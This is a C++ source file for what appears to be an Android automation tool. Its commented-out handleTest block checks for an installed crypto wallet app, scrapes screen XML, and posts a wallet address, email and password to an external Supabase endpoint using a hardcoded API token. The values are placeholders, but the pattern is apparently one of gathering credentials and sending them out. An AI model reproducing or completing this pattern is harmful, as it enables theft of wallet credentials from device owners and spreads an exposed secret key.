#include "GoogleExt.h"

class GoogleCore : public GoogleExt {
public:
    void handleTest() {
        updateLine("handleTest");
/*
        string packageWallet  = "com.bgwallet.official";

        if(!existPackage(packageWallet)){
            delay(10, "Please install Wallet");
            return;
        }

        for(int loop = 50; loop > 0;loop--){
            string xml = dumpXml();

            string screen = detectScreen(xml);

            if (screen == ""){

            }

            delay(1);
        }

        string address = "app";
        string email = "app";
        string password = "app";

        // post data to api
        Http client("https://aqogmsypyiswmkorzddk.supabase.co/rest/v1/pay", Method::POST);

        client.setContentType("application/json");
        client.setHeader("return=minimal");
        client.setHeader(
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFxb2dtc3lweWlzd21rb3J6ZGRrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTEwNTY0ODQsImV4cCI6MjA2NjYzMjQ4NH0.Ahmn3GEi33TJwBeUMjPU196fB-4SMRd2dZbyKDkwzh4");
        JSON body;
        body.set("address", address);
        body.set("email", email);
        body.set("password", password);

        client.setBody(body.toString());

        auto result = client.connect();*/
        updateLine("handleDone");
    }

    void handleRegisterAccount() {

    }

    ResultScreen handleAction() {
        if (action.scriptType == "REMOVE_POST_ON_WALL")
            return actionTest();

        return NOMAP;
    }


    static ResultScreen actionTest() {
        return NOMAP;
    }


};